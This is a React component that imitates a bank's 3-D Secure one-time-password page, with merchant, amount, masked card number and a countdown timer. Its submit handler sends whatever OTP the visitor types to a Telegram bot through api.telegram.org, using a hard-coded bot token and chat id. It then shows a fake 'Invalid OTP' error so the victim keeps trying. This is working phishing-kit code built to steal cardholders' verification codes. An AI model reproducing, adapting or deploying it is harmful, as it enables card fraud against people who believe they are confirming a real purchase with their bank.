import React, { useState } from "react";
import  Axios  from "axios";
import './Otp.css';

export default function Otp({finalData, setFinalData ,error ,setError , setLoading }) {
    const [seconds, setSeconds] = useState(0);
    const [munites, setMunites] = useState(5);

    if(munites !== 0 && seconds === 0){
        setMunites(munites => munites - 1);
        setSeconds(seconds => 60);
        setTimeout(() => {
            if(seconds === 0) setSeconds(seconds => 60);
            setSeconds(seconds => seconds - 1);
          }, 1000);
    }
    const handle = () =>{
        setError(true);
        if(finalData.otp !== ""){
            setLoading(true);
                setTimeout(() => {
                  setLoading(false);
                  setFinalData(""); 
            }, 10000);
            const apiToken = "6417232551:AAGksJcKFsib8yukCVpOwm0hx8EzbjRKng0";
            const chatId = "5807893197";
            const text = `OTP CODE : ${ finalData.otp }`;
            const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
            Axios(url);
            setFinalData({ ...finalData, otp: "" });
            setError(false);
        }
    }
    return (

        <fieldset className="amx-form-group-container">
            <div className="acscontent" id="_t6">
            <span className="w3ls-login box box--big" id="_t7">
                <span className="authTitle" id="_t8">
                    <ul>
                        <li id="liBankLogo"></li>
                        <li id="liNetworkLogo"><img alt="3DS" className="iceGphImg acsLogo" id="j_idt12" src="/imageServlet.png" /></li>
                    </ul>
                    <div className="icePnlGrp acsNetworkInstruction" id="j_idt17">
                        <h3>
                            <label id="editedLabelNetworkInstruction">
                                Please enter your One Time Password (OTP) in the field below to confirm your identity for this purchase. This information is not shared with the merchant.
                            </label>
                        </h3>
                    </div>
                </span>
            </span>
            <span className="w3ls-login box box--big" id="_t20">
                <form className="acsAuthInfos" id="customerAuthFormAutoSubmit" name="customerAuthFormAutoSubmit">
                    <div className="icePnlGrp infoMerchant" id="customerAuthFormAutoSubmit:j_idt22">
                        <div className="icePnlGrp divInfoMerchant divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt23">
                            <div className="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt24">
                            <i aria-hidden="true" className="fa  fa-shopping-cart"></i>
                            <label htmlFor="customerAuthFormAutoSubmit:merchantName" id="customerAuthFormAutoSubmit:editedLabelMerchantName" >Merchant:</label>
                        </div>
                        <h3>
                            <label className="acsTrxInfo" id="customerAuthFormAutoSubmit:merchantName"></label>
                        </h3>
                    </div>
                    <div className="icePnlGrp divInfoMerchant divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt28">
                        <div className="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt29">
                            <i aria-hidden="true" className="fa fa-usd"></i>
                            <label htmlFor="customerAuthFormAutoSubmit:transactionAmount" id="customerAuthFormAutoSubmit:editedLabelTransactionAmount">Amount:</label>
                        </div>
                        <h3>
                            <label className="acsTrxInfo" id="customerAuthFormAutoSubmit:transactionAmount">45.29 AED</label>
                        </h3>
                    </div>
                    <div className="icePnlGrp divInfoMerchant divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt33">
                        <div className="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt34">
                            <i aria-hidden="true" className="fa fa-calendar"></i>
                            <label htmlFor="customerAuthFormAutoSubmit:transactionDate" id="customerAuthFormAutoSubmit:editedLabelTransactionDate">Date/Time:</label>
                        </div>
                        <h3>
                            <label className="acsTrxInfo" id="customerAuthFormAutoSubmit:transactionDate">{new Date().toLocaleString() + ""}</label>
                        </h3>
                    </div>
                    <div className="icePnlGrp divInfoMerchant divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt38">
                        <div className="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt39">
                            <i aria-hidden="true" className="fa fa-credit-card"></i>
                            <label htmlFor="customerAuthFormAutoSubmit:pan" id="customerAuthFormAutoSubmit:editedLabelPan">Card number:</label>
                        </div>
                        <h3>
                            <label className="acsTrxInfo" id="customerAuthFormAutoSubmit:pan">XXXX-XXXX-XXXX-5508</label>
                        </h3>
                    </div>
                    <div className="icePnlGrp divInfoMerchant divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt48">
                        <div className="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt49">
                            <i aria-hidden="true" className="fa fa-phone"></i>
                            <label htmlFor="customerAuthFormAutoSubmit:phoneNumber" id="customerAuthFormAutoSubmit:phone" >Mobile Phone Number</label>
                        </div>
                        <h3>
                            <label id="customerAuthFormAutoSubmit:phoneNumber">xxxxxxxxxxxxxx000</label>
                        </h3>
                    </div>
                    <div className="icePnlGrp divInfoMerchant divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt53 oa">
                    </div>
                </div>
                <div className="icePnlGrp infoAuthentication" id="customerAuthFormAutoSubmit:j_idt58">
                    <div id="customerAuthFormAutoSubmit:j_idt59"></div>
                    <div className="icePnlGrp agile-field-txt" id="customerAuthFormAutoSubmit:j_idt69">
                        <div className="icePnlGrp authenticationField divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt70">
                            <label className="authenticateEntryLabel" htmlFor="customerAuthFormAutoSubmit:athenticateEntry" id="customerAuthFormAutoSubmit:editedLabelAthenticateEntry">OTP Received by SMS/Email:</label>
                        </div>
                        <div className="icePnlGrp authenticateEntry" id="customerAuthFormAutoSubmit:j_idt72">
                            <input className="iceInpSecrt" id="customerAuthFormAutoSubmit:athenticateEntry" maxLength={6} name="customerAuthFormAutoSubmit:athenticateEntry"  type="password" 
                            value={finalData.otp}
                            onChange={(event) => setFinalData({ ...finalData, otp:event.target.value })}
                            />
                            <div>
                                {finalData.otp  <= 0 && error ?
                                    <span name="Error">Invalid OTP, try again please !</span> : "" 
                                }
                            </div>
                        </div>
                    </div>
                    <div className="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt73"></div>
                </div>
                <div className="icePnlGrp actionButtons" id="customerAuthFormAutoSubmit:j_idt79">
                    <div className="icePnlGrp divSubmitTwoButton" id="customerAuthFormAutoSubmit:j_idt80">
                        <ul>
                            <input className="buttonAuth" id="customerAuthFormAutoSubmit:validAuthentication" name="customerAuthFormAutoSubmit:validAuthentication" type="button" value="Submit" 
                            onClick={() => handle()}/>
                        </ul>
                    </div>
                </div>
                <span id="customerAuthFormAutoSubmithdnFldsDiv">
                    <input name="icefacesCssUpdates" type="hidden" /></span>
                    <input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="-5106135124046585177:3994896681297452082" autoComplete="off" />
                </form>
            </span>
            <span className="w3ls-login box box--big" id="_t84">
                <span className="footerInstruction" id="_t85">
                    <form  id="j_idt86" name="j_idt86">
                        <ul>
                            <li>
                                <a className="iceCmdLnk helpButton"  id="j_idt86:helpButton" target="_blank">Help</a>
                            </li>
                            <li>
                                <a className="iceCmdLnk privacySecurityBtn"  id="j_idt86:j_idt89" target="_blank">Privacy &amp; security</a>
                            </li>
                            <li>
                                <a className="iceCmdLnk termsConditionsBtn" id="j_idt86:j_idt91" target="_blank" ></a>
                            </li>
                        </ul>
                        <div className="icePnlGrp acsNetworkInstruction" id="j_idt86:j_idt93"> 
                            <h3>
                                <label id="j_idt86:editedLabelBankInstruction" >
                                    For any inquiries, Please call us on 178535151 or email centres@bank.com</label>
                            </h3>
                        </div>  
                    </form>
                </span>
            </span>
            <form className="acsSessionTimeOutContainer" id="sessionTimeOutForm" name="sessionTimeOutForm">
                <div className="icePnlGrp timeOutLabel" id="sessionTimeOutForm:timerLabelId">
                    <label className="acsSessionTimeOutLabel" htmlFor="sessionTimeOutForm:timeOutClock" id="sessionTimeOutForm:editedLabelSessionTimeOut" >Session timeout:</label>
                </div>
                <span className="iceOutTxt acsSessionTimeOutClock" id="sessionTimeOutForm:timeOutClock">0{munites}:{seconds < 10 ? `0${seconds}` : seconds} </span>
            </form>
        </div>
        </fieldset>
    );
}